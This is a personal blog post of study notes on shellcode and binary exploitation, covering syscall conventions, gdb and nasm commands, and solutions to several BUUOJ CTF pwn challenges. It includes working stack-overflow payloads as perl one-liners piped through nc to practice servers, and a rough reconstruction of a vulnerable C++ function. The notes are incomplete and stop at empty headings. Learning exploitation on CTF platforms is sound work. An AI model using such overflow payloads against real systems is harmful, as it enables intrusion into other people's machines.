---
layout: post
title:  "shellcode入门"
date:   2020-07-11 12:15:38 +0800
---

# Introduction

- stack overflow
- heap overflow
- format string

## Linux syscall

```shell
/usr/include/asm/unistd_32.h
/usr/include/x86_64-linux-gnu/asm/unistd_32.h
/usr/include/x86_64-linux-gnu/asm/unistd_64.h
```

- via interrupt
  - syscall number -> EAX
  - arguments -> EBX, ECX, EDX, ESI, EDI, EBP
  - int 0x80
  - fastcall
- libc(not portable, why?)

# *BSD syscall

- via interrupt
  - syscall number -> EAX
  - arguments -> stack
  - push one more dword
  - int 0x80
  - clean up stack

# Shellcode

gcc -o get_shell get_shell.c -fno-stack-protector -z execstack -m32


# commands
## gdb

1. run with piped input: run < <(echo 1)
2. disas
3. b
4. si and ni
5. force gdb to disassemble address: disas ADDR, +COUNT

## nasm

1. assemble for x86_64: nasm -f elf64 xx.asm

# BUUOJ PWN
0. Preparation
   1. file xxx
      1. arch, stripped?
   2. checksec
1. ida system("/bin/sh");
   1. perl -e 'print "ls\ncat flag\n"' | nc node3.buuoj.cn 26334
2. rip
   1. existing 'system("/bin/sh")'
   2. segfault?
3. warmup_csaw_2016
   1. `perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | nc node3.buuoj.cn 29619`
4. pwn1
   1. `perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | nc node3.buuoj.cn 25859`
   2. source: `I` -> `you`
5. ciscn_2019_n_1
   1. floating point number comparison
      1. xmm registers, saturation arithmetic and clamping
      2. SIMD instructions
   2. 11.28125: sizeof(float)=4, memory={0x00 0x80 0x34 0x41}
   3. `perl -e 'print "A"x(0x30-4) . "\x00\x80\x34\x41\n"' | nc node3.buuoj.cn 25060`
6. ciscn_2019_c_1
   1. encrypt:
      1. [0x7b, ] -> c
      2. [0x61, 0x7a] -> c ^= 0x0d
      3. [0x5B, 0x60] -> c
      4. [0x41, 0x5A] -> c ^= 0x0e
      5. [0x30, 0x40] -> c ^= 0x0f
      6. [, 0x2F] -> c


## Source
### 4. pwn1
```c
std::string input;

void vuln() {
  char v3c[/*???*/];
  std::string local;
  fgets(v3c, 0x20, STDIN);
  input = v3c;
  replace(local, input, std::string("I"), std::string("you"))
  input = local
  strcpy(input.c_str(), v3c);
}

int replace(std::string& a0, std::string& a4, const std::string& a8, const std::string& ac) {
  while (true) {
    unsigned int index = a4.find(a8, 0);
    if (index == 0xffffffff)
      break;

    iterator v34 = a4.begin() + a4.find(a8, 0);
    std::string v44(a4.begin(), v34, v3d);

    iterator v14 = a4.begin() + a4.find(a8, 0) + a8.length();
    std::string v48(v14, a4.end(), v29);

    std::string v10= v44+ac+v48;
    a4=v10;
  }
  a0=a4;
}

# Diffs between x86 and x86_64 in ROP

## x86_64
## 